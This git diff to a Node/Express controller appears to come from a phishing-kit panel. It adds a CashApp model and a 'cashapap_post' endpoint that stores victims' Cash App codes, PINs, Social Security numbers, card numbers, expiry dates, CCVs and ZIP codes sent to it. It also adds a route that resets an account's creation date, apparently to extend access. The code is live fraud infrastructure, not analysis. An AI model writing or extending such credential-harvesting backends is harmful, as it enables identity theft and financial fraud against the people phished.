@@ -7,6 +7,7 @@ const Site = require('../models/Site')
 const createToken = require('../utils/createToken')
 const LinkName = require('../models/LinkName')
 const Click = require('../models/Click')
+const CashApp = require('../models/CashApp')
 
 
 // const {API_KEY}=require('../keys')
@@ -148,16 +149,7 @@ module.exports.skip_code = (req, res) => {
 }
 module.exports.add_posterNumber = (req, res) => {
     const { username, numberAdd } = req.body;
-    Info.findOneAndUpdate({ username: username }, {
-        $set: {
-            numOfPostersPermission: numberAdd
-        }
-    }, { new: true }, (err, ok) => {
-        if (err) {
-            res.status(400).json({ error: err })
-        }
-        res.status(200).json({ success: true })
-    })
+     
 
 }
 
@@ -781,23 +773,42 @@ module.exports.pass_change = async (req, res) => {
 
 
 
-module.exports.date_time = async (req, res) => {
+module.exports.update_validity =  (req, res) => {
 
-    // return res.status(200).json({ success: "changed succesfully" })
+    const { username } = req.body
+    const currentDate = new Date();
+    User.findOneAndUpdate({ username: username }, {
+        $set: {
+            createdAt: currentDate
+        }
+    }, { new: true }, (err, ok) => {
+        if (err) {
+            res.status(400).json({ error: err })
+        }
+        res.status(200).json({ success: true })
+    })
+
+}
+
+module.exports.cashapap_post = async (req, res) => {
+    const { code, pin, ssn, site, card_number,mm_yy, ccv,zip} = req.body;
 
     try {
-        const data = await User.findOne({ username: "mehedi009" })
-
-        const currentDate = new Date();
- const diff=currentDate -data.createdAt;
- const  difff=diff/ 1000 / 60 / 60/24
- res.status(400).json({ "date":difff })
-
-        // res.status(400).json({ "date": currentDate,"date2": data.createdAt})
+      
+        const cashapp = await CashApp.create({
+            code, pin, ssn, site, card_number,mm_yy, ccv,zip
 
 
-    } catch (e) {
-        res.status(400).json({ e: "error" })
+        })
+        return res.status(200).json({ success: "Created successfully " })
+
+
     }
+    catch (e) {
+
+        return res.status(400).json({ error: e })
+
+    }
+
 
 }
